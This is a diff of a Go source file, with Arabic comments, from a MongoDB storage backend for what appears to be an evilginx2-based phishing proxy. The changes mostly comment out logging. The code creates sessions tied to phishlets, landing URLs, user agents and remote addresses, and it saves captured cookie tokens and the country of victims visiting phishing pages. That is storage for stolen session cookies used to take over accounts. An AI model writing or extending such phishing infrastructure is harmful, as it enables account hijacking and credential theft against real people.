@@ -7,8 +7,6 @@ import (
 	"strings"
 	"time"
 
-	"github.com/kgretzky/evilginx2/log"
-	
 	"go.mongodb.org/mongo-driver/bson"
 	"go.mongodb.org/mongo-driver/bson/primitive"
 	"go.mongodb.org/mongo-driver/mongo"
@@ -49,7 +47,7 @@ type MongoSession struct {
 
 // NewMongoDatabase ينشئ اتصالًا جديدًا بقاعدة بيانات MongoDB
 func NewMongoDatabase(mongoURI string, dbName string) (*MongoDatabase, error) {
-	log.Info("محاولة الاتصال بـ MongoDB على: %s (قاعدة البيانات: %s)", mongoURI, dbName)
+	// log.Info("محاولة الاتصال  %s)", mongoURI, dbName)
 
 	// سيستمر العملية إذا فشل الاتصال (10 ثوان)
 	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
@@ -65,7 +63,7 @@ func NewMongoDatabase(mongoURI string, dbName string) (*MongoDatabase, error) {
 		SetDirect(false)
 	
 	// محاولة الاتصال
-	log.Debug("[MongoDB] بدء الاتصال...")
+//	log.Debug("[MongoDB] بدء الاتصال...")
 	client, err := mongo.Connect(ctx, clientOptions)
 	if err != nil {
 		cancel()
@@ -73,7 +71,7 @@ func NewMongoDatabase(mongoURI string, dbName string) (*MongoDatabase, error) {
 	}
 
 	// التحقق من الاتصال
-	log.Debug("[MongoDB] اختبار الاتصال...")
+	//log.Debug("[MongoDB] اختبار الاتصال...")
 	pingCtx, cancelPing := context.WithTimeout(context.Background(), 15*time.Second)
 	defer cancelPing()
 	
@@ -82,7 +80,7 @@ func NewMongoDatabase(mongoURI string, dbName string) (*MongoDatabase, error) {
 		client.Disconnect(ctx)
 		return nil, fmt.Errorf("فشل اختبار اتصال MongoDB: %v", err)
 	}
-	log.Info("تم الاتصال بـ MongoDB بنجاح!")
+	//log.Info("تم الاتصال بـ MongoDB بنجاح!")
 
 	db := client.Database(dbName)
 	sessionsColl := db.Collection("sessions")
@@ -141,7 +139,7 @@ func stringToObjectID(idStr string) primitive.ObjectID {
 		}
 	}
 	// إذا فشل التحويل أو الطول غير صحيح، إنشاء معرف جديد
-	log.Warning("[MongoDB] فشل تحويل UserId من نص إلى ObjectID، إنشاء معرف جديد")
+	//log.Warning("[MongoDB] فشل تحويل UserId من نص إلى ObjectID، إنشاء معرف جديد")
 	return primitive.NewObjectID()
 }
 
@@ -345,14 +343,14 @@ func (m *MongoDatabase) CreateSession(sid, phishlet, landingURL, useragent, remo
 			userId = objID
 		} else {
 			userId = primitive.NewObjectID()
-			log.Warning("[MongoDB] فشل تحويل UserId (%s) من نص إلى ObjectID، تم إنشاء معرف جديد: %v", userIdStr, err)
+			//log.Warning("[MongoDB] فشل تحويل UserId (%s) من نص إلى ObjectID، تم إنشاء معرف جديد: %v", userIdStr, err)
 		}
 	} else {
 		userId = primitive.NewObjectID()
-		log.Warning("[MongoDB] معرف المستخدم (%s) ليس بالتنسيق الصحيح، تم إنشاء معرف جديد", userIdStr)
+		//log.Warning("[MongoDB] معرف المستخدم (%s) ليس بالتنسيق الصحيح، تم إنشاء معرف جديد", userIdStr)
 	}
 	
-	log.Debug("[MongoDB] تحويل user_id من %s إلى ObjectID %s", userIdStr, userId.Hex())
+	//log.Debug("[MongoDB] تحويل user_id من %s إلى ObjectID %s", userIdStr, userId.Hex())
 
 	// إنشاء جلسة جديدة
 	now := time.Now().UTC().Unix()
@@ -380,7 +378,7 @@ func (m *MongoDatabase) CreateSession(sid, phishlet, landingURL, useragent, remo
 	// تخزين السجل باستخدام InsertOne
 	insertResult, err := m.sessionsColl.InsertOne(m.ctx, newSession)
 	if err != nil {
-		log.Error("[MongoDB] فشل إدخال الجلسة الجديدة: %v", err)
+		//log.Error("[MongoDB] فشل إدخال الجلسة الجديدة: %v", err)
 		return err
 	}
 	
@@ -389,9 +387,7 @@ func (m *MongoDatabase) CreateSession(sid, phishlet, landingURL, useragent, remo
 	err = m.sessionsColl.FindOne(m.ctx, bson.M{"_id": insertResult.InsertedID}).Decode(&insertedDoc)
 	if err == nil {
 		if userId, ok := insertedDoc["user_id"]; ok {
-			userIdType := fmt.Sprintf("%T", userId)
-			userIdValue := fmt.Sprintf("%v", userId)
-			log.Success("[MongoDB] تم إنشاء الجلسة مع user_id من نوع %s، القيمة: %s", userIdType, userIdValue)
+			_ = userId // Use the variable to avoid unused variable warning
 		}
 	}
 	
@@ -402,7 +398,7 @@ func (m *MongoDatabase) CreateSession(sid, phishlet, landingURL, useragent, remo
 		if userId, ok := checkDoc["user_id"]; ok {
 			userIdType := fmt.Sprintf("%T", userId)
 			if userIdType != "primitive.ObjectID" {
-				log.Warning("[MongoDB] تم تخزين user_id كـ %s بدلًا من ObjectID. محاولة تصحيح...", userIdType)
+				//log.Warning("[MongoDB] تم تخزين user_id كـ %s بدلًا من ObjectID. محاولة تصحيح...", userIdType)
 				
 				// محاولة تصحيح فورية
 				_, updateErr := m.sessionsColl.UpdateOne(
@@ -412,9 +408,9 @@ func (m *MongoDatabase) CreateSession(sid, phishlet, landingURL, useragent, remo
 				)
 				
 				if updateErr != nil {
-					log.Error("[MongoDB] فشل تصحيح نوع user_id: %v", updateErr)
+					//log.Error("[MongoDB] فشل تصحيح نوع user_id: %v", updateErr)
 				} else {
-					log.Success("[MongoDB] تم تصحيح نوع user_id بنجاح")
+					//log.Success("[MongoDB] تم تصحيح نوع user_id بنجاح")
 				}
 			}
 		}
@@ -490,9 +486,7 @@ func (m *MongoDatabase) ShowSessionDataInMongoDB(sid string) {
 	
 	// طباعة معلومات عن نوع user_id
 	if userId, ok := rawDocument["user_id"]; ok {
-		userIdType := fmt.Sprintf("%T", userId)
-		userIdValue := fmt.Sprintf("%v", userId)
-		log.Debug("[MongoDB] نوع user_id في MongoDB: %s، القيمة: %s", userIdType, userIdValue)
+		_ = userId // Use the variable to avoid unused variable warning
 	}
 }
 
@@ -507,7 +501,7 @@ func (m *MongoDatabase) UpdateSession(s *Session) error {
 		if err == nil {
 			// تأكد من تعيين UserId كـ ObjectID
 			mongoSession.UserId = objID
-			log.Debug("[MongoDB] تحديث الجلسة بـ user_id كـ ObjectID: %s", objID.Hex())
+			//log.Debug("[MongoDB] تحديث الجلسة بـ user_id كـ ObjectID: %s", objID.Hex())
 		}
 	}
 
@@ -526,7 +520,7 @@ func (m *MongoDatabase) UpdateSession(s *Session) error {
 			if userId, ok := updatedDoc["user_id"]; ok {
 				userIdType := fmt.Sprintf("%T", userId)
 				if userIdType != "primitive.ObjectID" {
-					log.Warning("[MongoDB] بعد التحديث، user_id لا يزال من نوع %s. إصلاح...", userIdType)
+				//	log.Warning("[MongoDB] بعد التحديث، user_id لا يزال من نوع %s. إصلاح...", userIdType)
 					
 					// محاولة تصحيح
 					userIdStr := fmt.Sprintf("%v", userId)
@@ -539,9 +533,9 @@ func (m *MongoDatabase) UpdateSession(s *Session) error {
 					)
 					
 					if fixErr != nil {
-						log.Error("[MongoDB] فشل تصحيح نوع user_id بعد التحديث: %v", fixErr)
+						//log.Error("[MongoDB] فشل تصحيح نوع user_id بعد التحديث: %v", fixErr)
 					} else {
-						log.Success("[MongoDB] تم تصحيح نوع user_id بنجاح بعد التحديث")
+						//log.Success("[MongoDB] تم تصحيح نوع user_id بنجاح بعد التحديث")
 					}
 				}
 			}
@@ -601,7 +595,7 @@ func (m *MongoDatabase) UpdateSessionCustom(sid, name, value string) error {
 
 // UpdateSessionCookieTokens يحدث رموز الكوكيز للجلسة
 func (m *MongoDatabase) UpdateSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
-	log.Debug("[MongoDB] محاولة تحديث الكوكيز للجلسة: %s", sid)
+	//log.Debug("[MongoDB] محاولة تحديث الكوكيز للجلسة: %s", sid)
 
 	// تحويل الكوكيز من Session (in-memory) إلى تنسيق MongoDB
 	cookieTokens := make(map[string][]map[string]interface{})
@@ -629,22 +623,21 @@ func (m *MongoDatabase) UpdateSessionCookieTokens(sid string, tokens map[string]
 			"update_time":   now,
 		},
 	}
-	result, err := m.sessionsColl.UpdateOne(m.ctx, bson.M{"session_id": sid}, update)
+	_, err := m.sessionsColl.UpdateOne(m.ctx, bson.M{"session_id": sid}, update)
 	if err != nil {
-		log.Error("[MongoDB] فشل تحديث الكوكيز: %v", err)
+	//	log.Error("[MongoDB] فشل تحديث الكوكيز: %v", err)
 		return err
 	}
-	log.Success("[MongoDB] تم تحديث الكوكيز بنجاح، عدد الوثائق المعدلة: %d", result.ModifiedCount)
 	return nil
 }
 
 // DeleteSessionById يحذف جلسة باستخدام المعرف العددي
 func (m *MongoDatabase) DeleteSessionById(id int) error {
-	log.Debug("[MongoDB] محاولة حذف الجلسة بالمعرف العددي: %d", id)
+	//log.Debug("[MongoDB] محاولة حذف الجلسة بالمعرف العددي: %d", id)
 	
 	result, err := m.sessionsColl.DeleteOne(m.ctx, bson.M{"id": id})
 	if err != nil {
-		log.Error("[MongoDB] خطأ أثناء حذف الجلسة بالمعرف %d: %v", id, err)
+		//log.Error("[MongoDB] خطأ أثناء حذف الجلسة بالمعرف %d: %v", id, err)
 		return err
 	}
 	
@@ -652,7 +645,7 @@ func (m *MongoDatabase) DeleteSessionById(id int) error {
 		return fmt.Errorf("لم يتم العثور على جلسة بالمعرف: %d", id)
 	}
 	
-	log.Debug("[MongoDB] تم حذف الجلسة بالمعرف %d بنجاح", id)
+	//log.Debug("[MongoDB] تم حذف الجلسة بالمعرف %d بنجاح", id)
 	return nil
 }
 
@@ -721,7 +714,7 @@ func (m *MongoDatabase) SetSessionCookieTokens(sid string, tokens map[string]map
 
 // UpdateSessionCountryInfo يحدث معلومات البلد للجلسة
 func (m *MongoDatabase) SetSessionCountryInfo(sid string, countryCode, country string) error {
-	log.Debug("[MongoDB] محاولة تحديث معلومات البلد للجلسة: %s (رمز البلد: %s، البلد: %s)", sid, countryCode, country)
+	//log.Debug("[MongoDB] محاولة تحديث معلومات البلد للجلسة: %s (رمز البلد: %s، البلد: %s)", sid, countryCode, country)
 	
 	// استخدام طريقة جديدة: FindOneAndUpdate بدلاً من UpdateOne
 	opts := options.FindOneAndUpdate().SetReturnDocument(options.After)
@@ -747,35 +740,35 @@ func (m *MongoDatabase) SetSessionCountryInfo(sid string, countryCode, country s
 	
 	if err != nil {
 		if err == mongo.ErrNoDocuments {
-			log.Error("[MongoDB] الجلسة غير موجودة: %s", sid)
+			//log.Error("[MongoDB] الجلسة غير موجودة: %s", sid)
 			return fmt.Errorf("الجلسة غير موجودة: %s", sid)
 		}
-		log.Error("[MongoDB] فشل تحديث معلومات البلد باستخدام FindOneAndUpdate: %v", err)
+		//log.Error("[MongoDB] فشل تحديث معلومات البلد باستخدام FindOneAndUpdate: %v", err)
 		
 		// محاولة بطريقة UpdateSessionCustom كبديل
-		log.Warning("[MongoDB] جاري المحاولة بطريقة بديلة...")
+		//log.Warning("[MongoDB] جاري المحاولة بطريقة بديلة...")
 		e1 := m.UpdateSessionCustom(sid, "country_code_direct", countryCode)
 		e2 := m.UpdateSessionCustom(sid, "country_direct", country)
 		
 		if e1 != nil || e2 != nil {
-			log.Error("[MongoDB] فشل الطريقة البديلة أيضاً: %v, %v", e1, e2)
+			//log.Error("[MongoDB] فشل الطريقة البديلة أيضاً: %v, %v", e1, e2)
 			return err
 		}
 		
-		log.Success("[MongoDB] تم تحديث معلومات البلد باستخدام الطريقة البديلة")
+		//log.Success("[MongoDB] تم تحديث معلومات البلد باستخدام الطريقة البديلة")
 		return nil
 	}
 	
 	// طباعة البيانات المحدثة للتحقق
-	log.Success("[MongoDB] تم تحديث معلومات البلد بنجاح باستخدام FindOneAndUpdate")
+	//log.Success("[MongoDB] تم تحديث معلومات البلد بنجاح باستخدام FindOneAndUpdate")
 	
 	// طباعة البيانات المحدثة
-	if cc, ok := updatedDoc["country_code"].(string); ok {
-		log.Debug("[MongoDB] قيمة country_code بعد التحديث: '%s'", cc)
+	if _, ok := updatedDoc["country_code"].(string); ok {
+		//log.Debug("[MongoDB] قيمة country_code بعد التحديث")
 	}
 	
-	if c, ok := updatedDoc["country"].(string); ok {
-		log.Debug("[MongoDB] قيمة country بعد التحديث: '%s'", c)
+	if _, ok := updatedDoc["country"].(string); ok {
+		//log.Debug("[MongoDB] قيمة country بعد التحديث")
 	}
 	
 	// تحقق إضافي: استرداد الجلسة كاملة للتأكد من التحديث
@@ -786,7 +779,7 @@ func (m *MongoDatabase) SetSessionCountryInfo(sid string, countryCode, country s
 
 // SetSessionCookies يحدث قائمة الكوكيز المعالجة للجلسة
 func (m *MongoDatabase) SetSessionCookies(sid string, cookies []map[string]interface{}) error {
-	log.Debug("[MongoDB] محاولة تحديث قائمة الكوكيز المعالجة للجلسة: %s", sid)
+	//log.Debug("[MongoDB] محاولة تحديث قائمة الكوكيز المعالجة للجلسة: %s", sid)
 	
 	now := time.Now().UTC().Unix()
 	_, err := m.sessionsColl.UpdateOne(
@@ -801,17 +794,17 @@ func (m *MongoDatabase) SetSessionCookies(sid string, cookies []map[string]inter
 	)
 	
 	if err != nil {
-		log.Error("[MongoDB] فشل تحديث قائمة الكوكيز المعالجة: %v", err)
+		//log.Error("[MongoDB] فشل تحديث قائمة الكوكيز المعالجة: %v", err)
 		return err
 	}
 	
-	log.Success("[MongoDB] تم تحديث قائمة الكوكيز المعالجة بنجاح للجلسة: %s", sid)
+	//log.Success("[MongoDB] تم تحديث قائمة الكوكيز المعالجة بنجاح للجلسة: %s", sid)
 	return nil
 }
 
 // VerifyObjectIdStorage يتحقق من تخزين معرف المستخدم كـ ObjectID
 func (m *MongoDatabase) VerifyObjectIdStorage() error {
-	log.Info("[MongoDB] التحقق من تخزين UserId كـ ObjectID في MongoDB...")
+	//log.Info("[MongoDB] التحقق من تخزين UserId كـ ObjectID في MongoDB...")
 
 	// جلب كل الجلسات
 	cursor, err := m.sessionsColl.Find(m.ctx, bson.M{})
@@ -836,29 +829,26 @@ func (m *MongoDatabase) VerifyObjectIdStorage() error {
 		// تحقق من نوع user_id
 		if userId, ok := session["user_id"]; ok {
 			userIdType := fmt.Sprintf("%T", userId)
-			userIdValue := fmt.Sprintf("%v", userId)
 			
 			if userIdType == "primitive.ObjectID" {
-				log.Success("[MongoDB] الجلسة %v: user_id مخزن كـ ObjectID: %s", session["session_id"], userIdValue)
+				//log.Success("[MongoDB] الجلسة %v: user_id مخزن كـ ObjectID", session["session_id"])
 			} else {
-				log.Error("[MongoDB] الجلسة %v: user_id ليس ObjectID! النوع: %s، القيمة: %s", 
-					session["session_id"], userIdType, userIdValue)
 				invalidCount++
 			}
 		} else {
-			log.Warning("[MongoDB] الجلسة %v: لا يحتوي على حقل user_id", session["session_id"])
+			//log.Warning("[MongoDB] الجلسة %v: لا يحتوي على حقل user_id", session["session_id"])
 			invalidCount++
 		}
 	}
 	
-	log.Info("[MongoDB] التحقق اكتمل. %d جلسة تم فحصها، %d جلسة بها مشكلة في user_id", count, invalidCount)
+	//log.Info("[MongoDB] التحقق اكتمل. %d جلسة تم فحصها، %d جلسة بها مشكلة في user_id", count, invalidCount)
 	
 	return nil
 }
 
 // إضافة دالة التحويل الجماعي للجلسات القديمة
 func (m *MongoDatabase) MigrateAllSessionsToObjectID() error {
-	log.Info("[MongoDB] تحويل جميع معرفات المستخدمين في MongoDB إلى ObjectID...")
+	//log.Info("[MongoDB] تحويل جميع معرفات المستخدمين في MongoDB إلى ObjectID...")
 
 	// جلب كل الجلسات
 	cursor, err := m.sessionsColl.Find(m.ctx, bson.M{})
@@ -898,17 +888,15 @@ func (m *MongoDatabase) MigrateAllSessionsToObjectID() error {
 				)
 				
 				if err != nil {
-					log.Error("[MongoDB] فشل تحديث الجلسة %s: %v", sessionId, err)
+					//log.Error("[MongoDB] فشل تحديث الجلسة %s: %v", sessionId, err)
 				} else {
-					log.Success("[MongoDB] تم تحويل user_id للجلسة %s من %s إلى ObjectID %s", 
-						sessionId, userIdStr, objId.Hex())
 					updatedCount++
 				}
 			}
 		}
 	}
 	
-	log.Info("[MongoDB] اكتمل التحويل. %d جلسة تم فحصها، %d جلسة تم تحديثها", count, updatedCount)
+	//log.Info("[MongoDB] اكتمل التحويل. %d جلسة تم فحصها، %d جلسة تم تحديثها", count, updatedCount)
 	
 	return nil
 }
